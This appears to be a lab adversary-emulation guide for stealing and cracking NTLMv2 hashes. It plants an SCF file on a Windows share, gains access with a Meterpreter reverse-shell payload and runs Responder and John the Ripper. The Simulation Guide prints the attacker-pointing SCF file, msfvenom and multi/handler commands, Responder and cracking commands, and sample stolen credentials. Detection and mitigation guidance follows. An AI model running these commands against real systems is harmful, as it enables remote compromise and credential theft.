# Credential Access Module: Responder NTLM Hash Theft via SCF File

## Table of Contents

- [Usage Guide](#usage-guide)
	- [Module Summary](#module-summary)
	- [High-level Attack Flow](#high-level-attack-flow)
	- [Prerequisites](#prerequisites)
	- [Module Usage](#module-usage)
	- [Module Components](#module-components)
- [Simulation Guide](#simulation-guide)
	- [Initial Access and SCF Delivery](#initial-access-and-scf-delivery)
	- [NTLM Hash Capture with Responder](#ntlm-hash-capture-with-responder)
	- [Offline Hash Cracking with John the Ripper](#offline-hash-cracking-with-john-the-ripper)
- [Defense Guide](#defense-guide)
	- [Mitre ATT&CK TTPs](#mitre-attck-ttps)
	- [IoC Detection Checklist](#ioc-detection-checklist)
	- [Defensive Considerations](#defensive-considerations)
		- [File Share Security](#file-share-security)
		- [Network Security](#network-security)
		- [Monitoring and Detection](#monitoring-and-detection)

<br>
<br>

# Usage Guide

## Module Summary

A **Credential Access** module that exploits Windows automatic UNC path authentication to steal NTLMv2 password hashes from any user who browses a compromised network file share. This is accomplished by gaining initial access via a Meterpreter session, uploading a malicious SCF (Shell Command File) to a network share, starting Responder to capture inbound SMB authentication attempts, and then cracking the captured NTLMv2 hash offline using John the Ripper.

## High-level Attack Flow

1. Attacker generates a Windows Meterpreter reverse HTTPS payload and delivers it to the target workstation via SaltStack
2. Attacker launches a Metasploit multi/handler, executes the payload on the target as the victim user, and establishes a Meterpreter session
3. Attacker uses the Meterpreter session to upload a malicious SCF file (`$SCFName`) to a network file share (`\\hn-files\shares`)
4. Attacker starts Responder on the attacker's network interface to listen for inbound SMB authentication
5. Victim user browses to the file share; Windows Explorer automatically initiates an SMB connection to the attacker's IP to load the icon path referenced in the SCF file
6. Responder captures the victim's NTLMv2 hash from the SMB authentication request
7. Attacker cracks the captured NTLMv2 hash offline using John the Ripper

## Prerequisites

- `hn-wks-01` - Windows target workstation where the Meterpreter payload will be executed
- `hn-files` - Windows file server hosting the network share (`\\hn-files\shares`)
- `hn-scenario` - Kali attacker system where this module is executed
- Responder installed on the attacker system (`/usr/share/responder/`)
- John the Ripper installed on the attacker system (`/usr/share/john/`)
- SaltStack access to the target workstation (for payload delivery and share file management)
- `xfreerdp` and `xdotool` installed on the attacker system (for simulating victim RDP interaction)
- `tmux` installed on the attacker system (for running Responder in a background session)

## Module Usage

1. Set the environment variables in `env_vars.bash` to the appropriate values for your simulation (or just use the default values):

- `AttackerIP` - Attacker IP address for inbound SMB connections and Meterpreter reverse HTTPS
- `TargetSaltName` - Salt minion name of the Windows workstation where the payload will be executed
- `TargetUsername` - Username of the victim user account (used for RDP simulation and file path targeting)
- `InitialAccessPort` - Port to use for the Meterpreter `reverse_winhttps` connection
- `MSFPayload` - Metasploit payload module (e.g., `windows/x64/meterpreter/reverse_winhttps`)
- `PayloadName` - Filename for the generated Meterpreter payload (e.g., `gpdmonitor.exe`)
- `SCFName` - Filename for the SCF file to create and upload to the target share (e.g., `test.scf`)

2. Run the main module script, `ResponderNTLM.sh`:

	```bash
	bash ResponderNTLM.sh
	```

	The script will:
	- Generate an SCF file referencing the attacker's IP as the icon UNC path
	- Generate a Meterpreter payload with `msfvenom` and deliver it to the target via SaltStack
	- Launch `msfconsole` with `attack_data/multi_handler.rc` to catch the session and upload the SCF file to the share
	- Start Responder in a background `tmux` window to capture SMB authentication
	- Simulate the victim browsing to the file share via automated RDP interaction
	- Verify the captured NTLMv2 hash and crack it with John the Ripper

3. To reset the environment to a clean state after the module completes, run the reset script:

	```bash
	bash setup/reset.sh
	```

	The reset script will kill Responder and msfconsole, clear Responder logs, delete local artifacts (`$SCFName`, payload binary), terminate the payload process on the target, and remove the SCF file from the file share.

## Module Components

- `env_vars.bash` - Environment variables for the module
- `functions.bash` - Helper functions (`cr_checkprocess`, `cr_checkfile`, `copy_file_to_target`, `confirm_salt_connectivity`)
- `ResponderNTLM.sh` - Main module script; generates the SCF file, delivers and executes the payload, starts Responder, simulates victim browsing, captures and cracks the NTLMv2 hash
- `setup/` - Setup and teardown scripts
  - `reset.sh` - Reset script; cleans all artifacts from attacker and target systems and clears Responder logs
- `attack_data/` - Attack payloads and scripts
  - `multi_handler.rc` - Metasploit resource script (RC file) that catches the Meterpreter session, then uploads the SCF file to the network share

<br>
<br>

# Simulation Guide

## Initial Access and SCF Delivery

The attacker first generates a malicious SCF file that references a UNC icon path pointing to the attacker's machine:

```
[Shell]
Command=2
IconFile=//17.93.8.3/share/icon.ico
[Taskbar]
Command=ToggleDesktop
```

When Windows Explorer renders a directory listing containing this file, it automatically attempts to load the icon by connecting to the attacker's SMB server at `/17.93.8.3/share/icon.ico`. This connection includes the victim's NTLMv2 credentials.

The attacker then generates a Windows Meterpreter payload and delivers it to the target via SaltStack:

```bash
msfvenom -p windows/x64/meterpreter/reverse_winhttps LHOST=17.93.8.3 LPORT=42152 -f exe -o gpdmonitor.exe
```

The payload is transferred to the target workstation via SaltStack with SHA256 checksum verification:

```
[+] Copying gpdmonitor.exe to C:\Users\young.zaffina\Downloads\gpdmonitor.exe on hn-wks-01...
[+] Confirming SHA256 checksum of C:\Users\young.zaffina\Downloads\gpdmonitor.exe on hn-wks-01...
    - SHA256 checksum matches!
    - gpdmonitor.exe copied to C:\Users\young.zaffina\Downloads\gpdmonitor.exe on hn-wks-01 successfully.
```

Metasploit launches a `multi/handler` listener and executes the payload on the target as user `young.zaffina` via SaltStack PowerShell:

```ruby
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_winhttps
set LHOST 17.93.8.3
set LPORT 42152
exploit -j
```

```
[*] Started HTTPS reverse handler on https://17.93.8.3:42152
[*] https://17.93.8.3:42152 handling request from 172.16.0.102; (UUID: abc123) Staging x64 payload...
[*] Meterpreter session 1 opened (17.93.8.3:42152 -> 172.16.0.102:52341)

Active sessions
===============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  1         meterpreter x64/windows  HOLEY\young.zaffina @ HN-WKS-01  17.93.8.3:42152 -> 172.16.0.102:52341
```

With the Meterpreter session established, the attacker uploads the SCF file to the network share:

```
sessions -i 1 -C "upload $SCFName '\\\\hn-files\\shares\\$SCFName'"
```

| SCF (Shell Command File) File Technique |
| :---- |
| SCF files are Windows Shell Command Files that instruct Explorer to perform actions such as toggling the desktop or opening folders. The `IconFile` field accepts a UNC path, which Windows Explorer resolves automatically when rendering the directory listing — no user interaction beyond browsing the folder is required. Because Windows attempts to authenticate to the UNC path using the current user's credentials, an attacker-controlled SMB server can capture the NTLMv2 hash sent during this automatic authentication. This technique requires no vulnerability or exploitation — it exploits standard Windows behavior. |

## NTLM Hash Capture with Responder

With the SCF file placed on the share, the attacker starts Responder on the network interface to capture inbound SMB authentication:

```bash
sudo responder -I eth2 -w -d
```

```
[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    SMB server                 [ON]
    ...

[+] Generic Options:
    Responder NIC              [eth2]
    Responder IP               [17.93.8.3]
```

The victim's browsing of `\\hn-files\shares` is simulated via automated RDP interaction using `xfreerdp` and `xdotool`. When Windows Explorer renders the share contents and encounters `$SCFName`, it automatically initiates an outbound SMB connection to `\\17.93.8.3\share` to load the icon — triggering NTLMv2 authentication to Responder:

```
[SMB] NTLMv2 Client   : 172.16.0.102
[SMB] NTLMv2 Username : HOLEY\Young.Zaffina
[SMB] NTLMv2 Hash     : Young.Zaffina::HOLEY:1122334455667788:A1B2C3D4...:0101000000000000...
[SMB] NTLMv2 Hash saved to /usr/share/responder/logs/SMB-NTLMv2-SSP-130.2.2.2.txt
```

The captured hash is confirmed in the Responder logs:

```bash
ls -la /usr/share/responder/logs
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-130.2.2.2.txt
```

```
[+] NTLM hash stolen!
Young.Zaffina::HOLEY:1122334455667788:A1B2C3D4E5F6...:0101000000000000C0...
```

## Offline Hash Cracking with John the Ripper

With the NTLMv2 hash captured, the attacker cracks it offline using John the Ripper:

```bash
john /usr/share/responder/logs/SMB-NTLMv2-SSP-130.2.2.2.txt
```

```
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Proceeding with wordlist:/usr/share/john/password.lst
P@55w0rd!        (Young.Zaffina)
1g 0:00:00:01 DONE 2/3 (2026-03-11 10:22:14) 0.8928g/s 122947p/s
```

The cracked credentials are displayed:

```
┌─────────────────────────────────────┐
│  Username  →  young.zaffina         │
└─────────────────────────────────────┘
│  Password  →  P@55w0rd!             │
└─────────────────────────────────────┘
```

| NTLMv2 Hash Cracking |
| :---- |
| NTLMv2 is a challenge-response authentication protocol used by Windows for network authentication. While NTLMv2 is stronger than NTLMv1, the captured hash can be cracked offline through dictionary or brute-force attacks without interacting with the target system. John the Ripper supports the NTLMv2 (`netntlmv2`) format natively. Weak or common passwords are highly susceptible to cracking via wordlists. The cracked plaintext credentials can then be used for lateral movement, privilege escalation, or additional persistence. |

<br>
<br>

# Defense Guide

## Mitre ATT&CK TTPs

- Credential Access: [T1187 - Forced Authentication](https://attack.mitre.org/techniques/T1187/)
- Credential Access: [T1557.001 - Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001/)
- Credential Access: [T1110.002 - Brute Force: Password Cracking](https://attack.mitre.org/techniques/T1110/002/)
- Execution: [T1059.001 - Command and Scripting Interpreter: PowerShell](https://attack.mitre.org/techniques/T1059/001/)

## IoC Detection Checklist

| Responder NTLM Hash Theft Indicators |
| :---- |
| Detects creation of `.scf` files in network file shares (e.g., `\\hn-files\shares\*.scf`), especially files with `IconFile` values referencing external UNC paths |
| Detects outbound SMB connections (port 445) from workstations to unknown or non-corporate IP addresses, particularly triggered by file share browsing |
| Detects Responder activity: inbound SMB authentication attempts to non-domain-controller IPs, or LLMNR/NBT-NS/mDNS broadcast poisoning on the local subnet |
| Detects the Meterpreter payload binary (`gpdmonitor.exe`) in `C:\Users\<username>\Downloads\` on the target workstation |
| Detects outbound `reverse_winhttps` connections from the target workstation to the attacker IP on a non-standard HTTPS port (42152) |
| Detects NTLMv2 authentication attempts in Windows Security Event Logs (Event ID 4648 / 4624) where the target server IP is not a domain controller or known file server |

## Defensive Considerations

This attack can be mitigated by:

### File Share Security

- **Restrict write access to file shares** - Limit which users and groups can write files to network shares; standard users should not be able to place files in shared directories
- **Block SCF and other shell file types** - Use File Server Resource Manager (FSRM) or DFS file screening to block creation of `.scf`, `.lnk`, `.url`, and other shell file types on network shares
- **Disable automatic rendering of shell files** - Configure Group Policy to disable folder customization and suppress automatic icon loading from untrusted network locations
- **Enforce SMB signing** - Enable and require SMB signing on all domain controllers and file servers to prevent NTLM relay attacks that may follow hash capture
- **Disable NTLMv1** - Configure Group Policy to refuse LM and NTLMv1 authentication; enforce NTLMv2 minimally, but prefer Kerberos

### Network Security

- **Disable LLMNR and NBT-NS** - Configure Group Policy to disable Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) to eliminate Responder's primary poisoning vectors
- **Block outbound SMB at the perimeter** - Prevent workstations from initiating outbound SMB connections (port 445) to external or non-corporate IP addresses
- **Network segmentation** - Isolate file servers and workstations into separate VLANs with restricted inter-segment SMB access
- **Monitor for Responder signatures** - Deploy IDS/IPS rules to detect LLMNR and NBT-NS poisoning packets on the network

### Monitoring and Detection

- **Monitor file share write activity** - Alert on creation of `.scf`, `.lnk`, or `.url` files in network shares, especially by non-administrator accounts
- **Monitor Windows Security Event Logs** - Alert on Event ID 4648 (explicit credential logon) and Event ID 4624 (successful logon) where the target server is not a known domain controller or file server
- **Monitor for outbound SMB to non-standard IPs** - Use network monitoring or EDR to detect workstations initiating SMB connections to external IPs or internal IPs outside expected server ranges
- **Use endpoint detection and response (EDR)** - Implement EDR to detect Meterpreter payload execution, suspicious process creation from `Downloads` directories, and unusual outbound network connections from user-space processes
- **Implement a SIEM** - Correlate file share audit logs, Windows authentication events, and network flow data to detect the multi-stage sequence of payload execution, file share write, and outbound SMB authentication
- **Enforce strong password policies** - Require long, complex passwords to increase resistance to offline hash cracking; implement account lockout policies to limit online brute-force attempts
